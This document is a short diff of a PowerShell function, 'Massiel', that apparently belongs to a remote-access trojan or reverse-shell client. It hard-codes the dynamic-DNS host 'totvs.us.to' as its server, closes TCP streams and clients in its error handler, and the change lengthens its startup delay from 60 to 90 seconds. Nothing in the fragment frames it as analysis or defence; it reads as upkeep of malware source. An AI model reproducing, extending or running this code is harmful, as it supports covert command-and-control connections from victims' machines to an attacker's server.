@@ -2,7 +2,7 @@ Function Massiel {
 
         Try {
 
-            Start-Sleep -Seconds 60
+            Start-Sleep -Seconds 90
 
             $Hosts = 'totvs.us.to'
 			
@@ -58,6 +58,7 @@ Function Massiel {
         Catch {
 
             Start-Sleep -Seconds 9
+
                     $Streams.Close()
                     $Streams.Dispose()
                     $Clients.Close()
